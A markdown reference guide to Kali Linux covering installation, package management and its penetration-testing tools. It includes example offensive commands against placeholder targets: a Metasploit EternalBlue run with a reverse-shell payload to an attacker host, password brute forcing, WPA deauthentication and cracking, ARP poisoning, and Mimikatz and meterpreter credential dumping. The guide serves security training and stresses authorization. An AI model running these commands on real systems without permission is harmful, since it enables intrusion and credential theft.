# Kali Linux

## Introduction

Kali Linux is a Debian-based Linux distribution specifically designed for digital forensics, penetration testing, and security research. Developed and maintained by Offensive Security, Kali Linux has become the industry-standard platform for cybersecurity professionals, ethical hackers, and security researchers worldwide.

### Philosophy and Purpose

- **Offensive Security Focus**: Comprehensive penetration testing platform
- **Tool Integration**: 600+ pre-installed security tools
- **Professional Grade**: Used by security professionals globally
- **Regular Updates**: Weekly tool and system updates
- **Free and Open Source**: Completely free to use
- **Debian Foundation**: Based on Debian Testing for stability
- **Multi-Platform**: Works on x86, ARM, cloud, Docker

### Key Characteristics

- **Base**: Debian Testing (with Kali repositories)
- **Package Manager**: APT with specialized Kali repos
- **Init System**: systemd
- **Default Desktop**: Xfce (multiple options available)
- **Kernel**: Custom kernel with injection patches
- **Tool Count**: 600+ security and forensics tools
- **Architecture Support**: x86-64, ARM, ARM64
- **Live Mode**: Forensics mode with no disk mounting

### Target Audience

- **Penetration Testers**: Professional security auditors
- **Security Researchers**: Vulnerability researchers
- **Forensics Experts**: Digital forensics investigators
- **Network Administrators**: Security-conscious sysadmins
- **Students**: Learning cybersecurity
- **Bug Bounty Hunters**: Security vulnerability hunters
- **Red Team Operators**: Offensive security teams

### Use Cases

- Penetration testing and ethical hacking
- Web application security testing
- Network security auditing
- Wireless security assessment
- Digital forensics and incident response
- Reverse engineering and malware analysis
- Social engineering campaigns
- Security training and certification prep (OSCP, CEH)

### Not Recommended For

- General-purpose desktop use
- Beginners to Linux
- Production servers
- Daily driver systems
- Users without security background

## History and Evolution

### Origins

- **2006**: BackTrack 1.0 released (Kali's predecessor)
- **2013**: Kali Linux 1.0 released (complete rewrite from Debian)
- **2015**: Kali Linux 2.0 - rolling release model
- **2016**: Kali Linux for Windows Subsystem for Linux
- **2019**: Kali NetHunter for Android devices
- **2020**: Kali Linux on ARM (Raspberry Pi, etc.)
- **2021**: Kali Purple (defensive security)
- **2023**: Kali Linux 2023.x - modern tools and features

### Offensive Security

Kali Linux is developed by Offensive Security, the company behind:
- **OSCP**: Offensive Security Certified Professional
- **OSCE**: Offensive Security Certified Expert
- **OSWE**: Offensive Security Web Expert
- **Exploit Database**: Vulnerability and exploit archive
- **Training Courses**: Professional security training

## Resources

### Official Resources

- **Website**: <https://www.kali.org/>
- **Documentation**: <https://www.kali.org/docs/>
- **Tools**: <https://www.kali.org/tools/>
- **Download**: <https://www.kali.org/get-kali/>
- **Blog**: <https://www.kali.org/blog/>
- **Forums**: <https://forums.kali.org/>
- **Bug Tracker**: <https://bugs.kali.org/>

### Community Resources

- **Discord**: <https://discord.kali.org/>
- **Twitter**: @kalilinux
- **Reddit**: r/Kalilinux
- **IRC**: #kali-linux on OFTC
- **YouTube**: Kali Linux Official Channel

### Learning Resources

- [Kali Training](https://kali.training/) - Free official book
- [Offensive Security Training](https://www.offensive-security.com/courses-and-certifications/)
- [TryHackMe](https://tryhackme.com/) - Hands-on labs
- [HackTheBox](https://www.hackthebox.com/) - Practice platform
- [PentesterLab](https://pentesterlab.com/) - Web pentesting

---

## Installation

### System Requirements

**Minimum Requirements**:
- **RAM**: 2 GB (4+ GB recommended)
- **Disk**: 20 GB
- **Processor**: 1 GHz dual-core
- **Architecture**: x86-64, ARM, ARM64

**Recommended for Optimal Performance**:
- **RAM**: 8+ GB (for memory-intensive tools)
- **Disk**: 50+ GB SSD
- **Processor**: 4+ core modern CPU
- **Graphics**: Dedicated GPU for GPU-based cracking
- **Network**: Wireless adapter supporting monitor mode

### Installation Options

#### 1. Bare Metal Installation

```bash
# Download installer ISO
wget https://cdimage.kali.org/kali-2023.4/kali-linux-2023.4-installer-amd64.iso

# Verify checksum
sha256sum kali-linux-2023.4-installer-amd64.iso

# Create bootable USB (Linux)
sudo dd if=kali-linux-2023.4-installer-amd64.iso of=/dev/sdX bs=4M status=progress
sudo sync

# Windows: Use Rufus or Etcher
# Boot from USB and follow installer
```

**Installer Steps**:
1. Boot mode selection (graphical/text)
2. Language and location
3. Network configuration
4. Disk partitioning (guided or manual)
5. User creation (DO NOT use 'root' for daily use)
6. Desktop environment selection
7. Software selection
8. GRUB installation
9. Reboot

#### 2. Live Boot (No Installation)

```bash
# Download live ISO
wget https://cdimage.kali.org/kali-2023.4/kali-linux-2023.4-live-amd64.iso

# Boot from USB
# Credentials: kali / kali
# All changes lost on reboot unless using persistence

# Enable persistence (advanced)
# Requires creating encrypted persistence partition
# Follow: https://www.kali.org/docs/usb/usb-persistence/
```

#### 3. Virtual Machine

```bash
# Pre-built VM images available
# VMware: .vmx
# VirtualBox: .ova
# QEMU/KVM: .qcow2

# Download VM
wget https://cdimage.kali.org/kali-2023.4/kali-linux-2023.4-virtualbox-amd64.7z

# Extract and import
7z x kali-linux-2023.4-virtualbox-amd64.7z
# Import .ova file in VirtualBox

# Default credentials: kali / kali
# Change immediately: passwd
```

**VM Recommendations**:
- Allocate 4+ GB RAM
- 40+ GB disk space
- Enable 3D acceleration
- USB 3.0 controller (for wireless adapters)
- Bridged or NAT network

#### 4. Windows Subsystem for Linux (WSL)

```powershell
# Windows 11/10
# Enable WSL2
wsl --install

# Install Kali from Microsoft Store
# Or manually:
wsl --install -d kali-linux

# Launch
kali

# Update
sudo apt update && sudo apt full-upgrade -y

# Install kali-win-kex (GUI)
sudo apt install -y kali-win-kex
kex --win -s
```

#### 5. Docker Container

```bash
# Official Kali Docker image
docker pull kalilinux/kali-rolling

# Run interactively
docker run -it kalilinux/kali-rolling /bin/bash

# Inside container
apt update
apt install -y kali-tools-top10

# Persistent container
docker run -it --name kali -v kali-data:/root kalilinux/kali-rolling
```

#### 6. ARM Devices (Raspberry Pi, etc.)

```bash
# Download ARM image
wget https://cdimage.kali.org/kali-2023.4/kali-linux-2023.4-raspberry-pi-arm64.img.xz

# Extract
xz -d kali-linux-2023.4-raspberry-pi-arm64.img.xz

# Write to SD card
sudo dd if=kali-linux-2023.4-raspberry-pi-arm64.img of=/dev/sdX bs=4M status=progress

# Insert SD and boot
# Default: kali / kali
# SSH enabled by default on ARM images
```

### Post-Installation Setup

```bash
# Change default password (CRITICAL)
passwd

# Update system
sudo apt update
sudo apt full-upgrade -y

# Install additional tools
sudo apt install -y kali-linux-default

# Enable and configure services
sudo systemctl enable ssh
sudo systemctl start ssh

# Configure network
sudo systemctl enable NetworkManager
sudo systemctl start NetworkManager

# Install GPU drivers (if needed)
sudo apt install -y nvidia-driver nvidia-cuda-toolkit  # NVIDIA
sudo apt install -y amdgpu-pro                         # AMD
```

---

## Package Management

### APT in Kali

Kali uses standard Debian APT with custom Kali repositories.

```bash
# Update package lists
sudo apt update

# Upgrade all packages
sudo apt upgrade          # Safe upgrade
sudo apt full-upgrade     # Handle dependency changes (recommended)
sudo apt dist-upgrade     # Old name for full-upgrade

# Search for tools
apt search nmap
apt search --names-only metasploit

# Show package info
apt show metasploit-framework
apt policy burpsuite

# Install packages
sudo apt install nmap
sudo apt install sqlmap nikto

# Remove packages
sudo apt remove tool-name
sudo apt purge tool-name       # Remove with config files
sudo apt autoremove            # Clean up dependencies
```

### Kali Metapackages

Kali organizes tools into metapackages by category.

```bash
# Top 10 tools (recommended for beginners)
sudo apt install kali-tools-top10

# Core tools
sudo apt install kali-linux-core         # Minimal
sudo apt install kali-linux-default      # Standard set
sudo apt install kali-linux-large        # Large selection
sudo apt install kali-linux-everything   # ALL tools (~15 GB!)

# By category
sudo apt install kali-tools-web          # Web application testing
sudo apt install kali-tools-wireless     # Wireless attacks
sudo apt install kali-tools-passwords    # Password cracking
sudo apt install kali-tools-exploitation # Exploitation frameworks
sudo apt install kali-tools-forensics    # Forensics tools
sudo apt install kali-tools-social-engineering
sudo apt install kali-tools-sniffing-spoofing
sudo apt install kali-tools-vulnerability
sudo apt install kali-tools-reverse-engineering
sudo apt install kali-tools-database     # Database assessment
sudo apt install kali-tools-reporting    # Reporting tools

# Specific tool suites
sudo apt install kali-tools-gpu          # GPU-based cracking
sudo apt install kali-tools-hardware     # Hardware hacking
sudo apt install kali-tools-crypto-stego # Cryptography/steganography
sudo apt install kali-tools-fuzzing      # Fuzzing tools
sudo apt install kali-tools-windows-resources
sudo apt install kali-tools-information-gathering

# List all metapackages
apt search kali-tools
apt search kali-linux
```

### Tool Installation Examples

```bash
# Web testing
sudo apt install burpsuite nikto sqlmap dirb wfuzz

# Network scanning
sudo apt install nmap masscan rustscan

# Wireless
sudo apt install aircrack-ng reaver wifite kismet

# Exploitation
sudo apt install metasploit-framework armitage

# Password cracking
sudo apt install john hashcat hydra medusa

# Forensics
sudo apt install autopsy sleuthkit volatility3

# Social engineering
sudo apt install set evilginx2
```

### Kali Repositories

```bash
# View sources
cat /etc/apt/sources.list

# Kali Rolling (default)
deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware

# Additional branches (not recommended for mixing)
# kali-dev       - Development
# kali-bleeding-edge - Cutting edge
# kali-experimental - Experimental

# After changing sources
sudo apt update
```

---

## Penetration Testing Tools

### Information Gathering

```bash
# Network Discovery
nmap -sV -sC target.com           # Version and script scan
nmap -p- target.com                # All ports
masscan -p1-65535 target.com --rate=1000

# DNS Enumeration
dnsrecon -d target.com
dnsenum target.com
fierce --domain target.com

# Subdomain Enumeration
sublist3r -d target.com
amass enum -d target.com

# Web Application Fingerprinting
whatweb target.com
wappalyzer (browser extension)

# OSINT
theHarvester -d target.com -b google
maltego          # GUI OSINT tool
recon-ng         # Framework

# Service Enumeration
enum4linux target.com      # SMB enumeration
snmp-check target.com      # SNMP
```

### Vulnerability Analysis

```bash
# Web Vulnerability Scanners
nikto -h http://target.com
wpscan --url http://target.com    # WordPress
joomscan -u http://target.com     # Joomla

# Network Vulnerability Scanners
openvas          # Start OpenVAS service first
nessus           # Commercial, free home version

# Fuzzing
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ
ffuf -u http://target.com/FUZZ -w wordlist.txt

# SQL Injection Testing
sqlmap -u "http://target.com/page?id=1" --dbs
```

### Web Application Attacks

```bash
# Burp Suite (GUI)
burpsuite        # Professional web app testing

# Directory/File Brute Forcing
dirb http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
feroxbuster -u http://target.com

# XSS Testing
xsser -u "http://target.com/search?q=test"

# CSRF Testing
# Manual with Burp Suite

# Command Injection
commix -u "http://target.com/exec?cmd=test"

# SSL/TLS Testing
sslscan target.com
testssl target.com
```

### Exploitation

```bash
# Metasploit Framework
msfconsole

# Example Metasploit workflow:
msf6 > search eternal blue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOST target-ip
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST attacker-ip
msf6 > exploit

# Searchsploit (offline Exploit-DB)
searchsploit apache 2.4.49
searchsploit -m exploits/linux/remote/xxxxx.py

# Social Engineering Toolkit
setoolkit
# 1) Spear-Phishing
# 2) Website Attack Vectors
# 3) Mass Mailer
# ...

# PowerShell Empire (post-exploitation)
# Beacon/C2 framework
```

### Wireless Attacks

```bash
# Put wireless card in monitor mode
sudo airmon-ng start wlan0

# Capture handshakes (WPA/WPA2)
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
sudo aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon  # Deauth

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# WPS Attacks
wash -i wlan0mon                    # Detect WPS
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -vv

# WiFite (automated)
wifite --kill

# Rogue Access Point
hostapd-wpe         # WPA Enterprise
```

### Password Attacks

```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --incremental hashes.txt
john --show hashes.txt

# Hashcat (GPU-accelerated)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1000 -a 0 hashes.txt wordlist.txt                      # NTLM
hashcat -m 2500 -a 0 handshake.hccapx wordlist.txt                # WPA/WPA2

# Hydra (online brute force)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt http-post-form "login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Medusa
medusa -h target.com -u admin -P passwords.txt -M ssh

# CrackMapExec (SMB/WinRM)
crackmapexec smb target.com -u users.txt -p passwords.txt
```

### Sniffing and Spoofing

```bash
# Wireshark (GUI packet analyzer)
wireshark

# tcpdump
sudo tcpdump -i eth0 -w capture.pcap
sudo tcpdump -r capture.pcap

# Ettercap (MITM)
ettercap -G          # GUI
ettercap -T -M arp:remote /target-ip// //  # ARP poisoning

# Bettercap (modern MITM framework)
sudo bettercap -iface eth0
> net.probe on
> net.show
> set http.proxy.sslstrip true
> http.proxy on

# Responder (LLMNR/NBT-NS poisoning)
sudo responder -I eth0 -wrf
```

### Post-Exploitation

```bash
# Meterpreter (Metasploit payload)
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > download /path/to/file
meterpreter > upload /local/file /remote/path

# Empire/Starkiller
# PowerShell post-exploitation framework

# Mimikatz (Windows credential dumping)
# Run via Meterpreter or directly
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Lateral Movement
crackmapexec smb network/24 -u admin -H ntlm-hash --shares
psexec.py domain/user@target.com
```

### Forensics

```bash
# Autopsy (GUI)
autopsy

# Volatility (memory forensics)
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 netscan

# Foremost (file carving)
foremost -i disk.img -o output/

# Binwalk (firmware analysis)
binwalk firmware.bin
binwalk -e firmware.bin       # Extract

# strings
strings binary | grep -i password

# ExifTool (metadata)
exiftool image.jpg
```

### Reverse Engineering

```bash
# Ghidra (NSA tool)
ghidra

# Radare2
r2 binary
> aaa      # Analyze
> pdf @main # Disassemble main

# OllyDbg/x64dbg (Windows debuggers)
# Run in Wine or Windows VM

# IDA Free/Pro
# Commercial disassembler

# APKTool (Android)
apktool d app.apk
apktool b app/
```

---

## Wordlists and Resources

### Built-in Wordlists

```bash
# Kali includes several wordlist collections
/usr/share/wordlists/

# RockYou (most popular)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/rockyou.txt

# SecLists (must install)
sudo apt install seclists
/usr/share/seclists/

# Dirb
/usr/share/wordlists/dirb/

# Dirbuster
/usr/share/wordlists/dirbuster/

# Metasploit
/usr/share/metasploit-framework/data/wordlists/

# John
/usr/share/john/password.lst
```

### Custom Wordlist Generation

```bash
# CeWL (spider website for words)
cewl -d 2 -m 5 http://target.com -w wordlist.txt

# Crunch (pattern-based generation)
crunch 8 8 -t pass%%%% -o wordlist.txt

# Hashcat rules
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
```

---

## Kali Tools Summary

### Top 20 Essential Tools

1. **Nmap** - Network scanner
2. **Metasploit** - Exploitation framework
3. **Burp Suite** - Web app testing
4. **Wireshark** - Packet analyzer
5. **Aircrack-ng** - Wireless cracking
6. **John the Ripper** - Password cracker
7. **Hashcat** - GPU password cracker
8. **SQLMap** - SQL injection automation
9. **Hydra** - Online brute force
10. **Nikto** - Web server scanner
11. **Gobuster** - Directory brute forcer
12. **Netcat** - Network Swiss Army knife
13. **Mimikatz** - Windows credential dumping
14. **Responder** - LLMNR/NBT-NS poisoner
15. **Empire** - Post-exploitation framework
16. **Ghidra** - Reverse engineering
17. **Volatility** - Memory forensics
18. **theHarvester** - OSINT gathering
19. **Social Engineering Toolkit** - Social engineering
20. **CrackMapExec** - Network pentesting

---

## Best Practices

### Ethical and Legal Considerations

```
CRITICAL: Only test systems you own or have explicit written permission to test.

Legal Risks:
- Unauthorized access is illegal (Computer Fraud and Abuse Act, etc.)
- Criminal penalties: fines and imprisonment
- Civil liability for damages

Ethical Guidelines:
1. Get written authorization before testing
2. Define scope clearly
3. Respect privacy and data
4. Report vulnerabilities responsibly
5. Maintain client confidentiality
6. Follow rules of engagement
7. Document everything
8. Stay within legal boundaries

Recommended:
- Bug bounty programs (HackerOne, Bugcrowd)
- Capture The Flag (CTF) competitions
- Personal lab environments
- Practice platforms (HTB, THM)
```

### Security Hardening Kali

```bash
# Change default passwords
passwd kali
sudo passwd root  # If root enabled

# Create non-privileged user
sudo adduser normaluser
sudo usermod -aG sudo normaluser

# Enable firewall
sudo apt install ufw
sudo ufw enable
sudo ufw allow 22/tcp

# SSH hardening
sudo nano /etc/ssh/sshd_config
# PermitRootLogin no
# PasswordAuthentication no (use keys)
# Port 2222 (non-standard)
sudo systemctl restart ssh

# Disable unnecessary services
sudo systemctl disable bluetooth
sudo systemctl disable cups

# Regular updates
sudo apt update && sudo apt full-upgrade
```

### Organizing Engagement Data

```bash
# Project structure
mkdir -p ~/engagements/client-name/{recon,scans,exploits,loot,reports}

# Note-taking tools
sudo apt install cherrytree  # Hierarchical note-taking
sudo apt install obsidian    # Markdown notes
sudo apt install joplin      # Note-taking app

# Screenshot organization
flameshot       # Advanced screenshot tool
```

---

## Kali Variants

### Kali NetHunter

```
Platform: Android devices (rooted)
Purpose: Mobile penetration testing
Features:
- Full Kali toolkit on phone/tablet
- HID keyboard attacks
- BadUSB attacks
- MANA Evil Access Point
- Wireless testing with external adapters

Compatible Devices:
- OnePlus phones
- Nexus devices
- Samsung Galaxy series
- Generic Android (via chroot)

Installation:
- Download NetHunter image for device
- Flash via TWRP recovery
- Install NetHunter app
```

### Kali Purple

```
Released: 2023
Purpose: Defensive security (Blue Team)
Features:
- Defensive security tools
- SIEM (Elasticsearch/Kibana)
- IDS/IPS (Suricata/Zeek)
- GVM (OpenVAS)
- TheHive + Cortex
- Defensive mindset alongside offensive

Use Case: SOC analysts, blue teamers, defensive security
```

---

## Real-World Use Cases

### Case Study 1: Web Application Penetration Test

```
Scenario: E-commerce security assessment
Tools: Burp Suite Pro, SQLMap, Nikto, Gobuster
Process:
1. Reconnaissance: Sublist3r, theHarvester
2. Discovery: Nmap, Gobuster
3. Vulnerability Scanning: Nikto, WPScan
4. Manual Testing: Burp Suite (XSS, CSRF, logic flaws)
5. Exploitation: SQLMap (SQL injection to database access)
6. Reporting: Evidence collection, remediation advice

Outcome: 15 vulnerabilities found, 3 critical
Client: Fixed all critical issues before launch
```

### Case Study 2: Wireless Security Audit

```
Scenario: Corporate WiFi assessment
Tools: Aircrack-ng suite, Wifite, Hashcat
Process:
1. Reconnaissance: Airodump-ng survey
2. Capture: WPA handshake capture
3. Attack: Dictionary + rule-based cracking
4. Reporting: Weak password policy identified

Outcome: WPA2-PSK cracked in 4 hours
Recommendation: Migrate to WPA3-Enterprise
```

### Case Study 3: Internal Network Penetration Test

```
Scenario: Corporate network assessment
Tools: Nmap, CrackMapExec, Responder, Bloodhound
Process:
1. Network Discovery: Nmap /24 scan
2. LLMNR Poisoning: Responder (captured NTLMv2 hashes)
3. Hash Cracking: Hashcat (cracked user password)
4. Lateral Movement: CrackMapExec (SMB relay)
5. Privilege Escalation: Mimikatz (domain admin hash)
6. Domain Compromise: Bloodhound (attack path visualization)

Outcome: Full domain compromise in 2 days
Client: Implemented network segmentation, disabled LLMNR
```

---

## Conclusion

Kali Linux remains the gold standard for penetration testing and security research, offering a comprehensive, professionally-maintained toolkit for offensive security operations. While powerful, it must be used responsibly and ethically, strictly within legal and authorized boundaries.

For security professionals, Kali provides an unmatched platform for assessing system security, discovering vulnerabilities, and improving defensive posture. Combined with proper training, ethical guidelines, and continuous learning, Kali Linux serves as an essential tool in the modern cybersecurity professional's arsenal.

